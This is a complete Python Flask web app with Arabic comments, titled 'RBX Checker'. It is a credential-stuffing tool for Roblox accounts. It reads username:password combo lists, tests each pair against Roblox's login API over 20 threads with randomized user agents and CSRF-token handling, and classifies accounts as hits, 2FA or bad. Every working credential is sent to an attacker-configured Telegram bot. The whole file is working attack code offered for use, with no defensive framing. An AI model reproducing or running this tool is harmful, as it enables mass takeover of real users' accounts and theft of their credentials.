import os
import time
import threading
from queue import Queue, Empty

import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# الإعدادات المسبقة (تقدر تغيرها من هنا مباشرة)
BOT_TOKEN = ""  # حط التوكن هنا
CHAT_ID = ""    # حط الايدي هنا
WORKERS = 20    # عدد الثريدات

STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
    "logs": [],
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()

def log(line: str):
    entry = f"[{time.strftime('%H:%M:%S')}] {line}"
    with LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 300:
            STATE["logs"] = STATE["logs"][-300:]
    socketio.emit("log", {"line": entry})
    socketio.emit("stats", STATE["stats"])

def send_telegram(username, password, profile):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        msg = f"✅ ROBLOX HIT!\n👤 User: {username}\n🔑 Pass: {password}\n🔗 {profile}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg}, timeout=5)
    except Exception:
        pass

def check_roblox(username, password):
    s = requests.Session()
    s.headers.update({"User-Agent": generate_user_agent()})
    try:
        r = s.post("https://auth.roblox.com/v2/login", timeout=10)
        csrf = r.headers.get("x-csrf-token")
        if not csrf:
            return None
        
        login_data = {"ctype": "Username", "cvalue": username, "password": password}
        r = s.post("https://auth.roblox.com/v2/login", json=login_data, headers={"x-csrf-token": csrf}, timeout=10)
        
        if r.status_code == 200:
            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}"}
        
        if r.status_code == 403 and "twoStepVerificationRequired" in r.text:
            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}", "2fa": True}
            
        return None
    except Exception:
        return None

def worker(combo_queue):
    while not STOP_FLAG.is_set():
        try:
            combo = combo_queue.get_nowait()
        except Empty:
            return
        
        with LOCK:
            STATE["stats"]["processed"] += 1
            
        try:
            if ":" not in combo:
                combo_queue.task_done()
                continue
            username, password = combo.split(":", 1)
        except ValueError:
            combo_queue.task_done()
            continue
            
        result = check_roblox(username.strip(), password.strip())
        
        with LOCK:
            if result:
                if result.get("2fa"):
                    STATE["stats"]["2fa"] += 1
                else:
                    STATE["stats"]["hits"] += 1
            else:
                STATE["stats"]["bad"] += 1
                
        if result:
            status = "2FA" if result.get("2fa") else "HIT"
            log(f"{status} → {username}:{password}")
            send_telegram(result["username"], result["password"], result["profile"])
        else:
            log(f"BAD → {username}")
            
        socketio.emit("stats", STATE["stats"])
        combo_queue.task_done()

def run_checker(combos):
    with LOCK:
        STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(combos), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    combo_q = Queue()
    
    for c in combos:
        combo_q.put(c)
        
    log(f"بدأ الفحص لـ {len(combos)} حساب...")
    threads = []
    for _ in range(min(WORKERS, max(1, len(combos)))):
        t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    STATE["running"] = False
    log(f"خلصنا! صيد: {STATE['stats']['hits']} | 2FA: {STATE['stats']['2fa']} | خربان: {STATE['stats']['bad']}")

INDEX_HTML = r"""<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RBX Checker</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --err:#ff3b3b; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
  .wrap { max-width:800px; margin:0 auto; padding:20px; }
  h1 { font-size:18px; text-align:center; margin-bottom:20px; }
  .btn-start {
    display:block; width:100%; padding:15px; font-size:18px; font-weight:bold;
    background:var(--fg); color:#000; border:none; cursor:pointer;
    text-align:center; border-radius:5px; margin-bottom:20px;
  }
  .btn-start:disabled { background:#333; color:#666; cursor:not-allowed; }
  .stats { display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-bottom:20px; }
  .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; }
  .stat b { display:block; font-size:20px; margin-top:5px; }
  .term {
    background:#000; border:1px solid var(--dim); padding:10px;
    height:400px; overflow-y:auto; font-size:13px; line-height:1.5;
    white-space:pre-wrap; word-break:break-all; border-radius:5px;
  }
  .hit { color:var(--fg); font-weight:bold; }
  .bad { color:#ff8888; }
</style>
</head>
<body>
<div class="wrap">
  <h1>▶ RBX CHECKER</h1>
  
  <button id="start" class="btn-start">▶ ابدأ الصيد (START)</button>

  <div class="stats">
    <div class="stat">الصيد (Hits) <b id="s-hits">0</b></div>
    <div class="stat">2FA <b id="s-2fa">0</b></div>
    <div class="stat">الخربان (Bad) <b id="s-bad">0</b></div>
    <div class="stat">المعالج (Processed) <b id="s-proc">0</b></div>
  </div>

  <div class="term" id="term">> بانتظار أمر البدء...<br>> سيقوم النظام بقراءة الملف تلقائياً عند الضغط على START.</div>
</div>

<script>
const socket = io();
const term = document.getElementById("term");

function append(cls, text) {
  const div = document.createElement("div");
  div.className = cls;
  div.textContent = text;
  term.appendChild(div);
  term.scrollTop = term.scrollHeight;
}

socket.on("log", d => {
  let cls = "";
  if (d.line.includes("HIT")) cls = "hit";
  if (d.line.includes("BAD")) cls = "bad";
  append(cls, d.line);
});

socket.on("stats", s => {
  document.getElementById("s-hits").textContent = s.hits;
  document.getElementById("s-2fa").textContent = s["2fa"];
  document.getElementById("s-bad").textContent = s.bad;
  document.getElementById("s-proc").textContent = s.processed;
  if (s.processed >= s.total && s.total > 0) {
    document.getElementById("start").disabled = false;
    document.getElementById("start").textContent = "▶ ابدأ الصيد (START)";
  }
});

document.getElementById("start").onclick = async () => {
  const btn = document.getElementById("start");
  btn.disabled = true;
  btn.textContent = "جاري المعالجة...";
  append("", "> جاري قراءة الملف وبدء الفحص...");
  
  const r = await fetch("/api/start", { method: "POST" });
  const j = await r.json();
  if (!j.ok) {
    append("bad", "!! خطأ: " + j.error);
    btn.disabled = false;
    btn.textContent = "▶ ابدأ الصيد (START)";
  }
};
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/api/start", methods=["POST"])
def api_start():
    if STATE["running"]:
        return jsonify({"ok": False, "error": "شغال من قبل"}), 400
        
    try:
        with open("results_roblox.txt", "r", encoding="utf-8", errors="ignore") as f:
            combos = [line.strip() for line in f if ":" in line]
    except Exception as e:
        return jsonify({"ok": False, "error": f"ما لقى الملف results_roblox.txt: {str(e)}"}), 500
        
    if not combos:
        return jsonify({"ok": False, "error": "الملف فاضي أو مافي كومبو صحيح"}), 400

    threading.Thread(target=run_checker, args=(combos,), daemon=True).start()
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
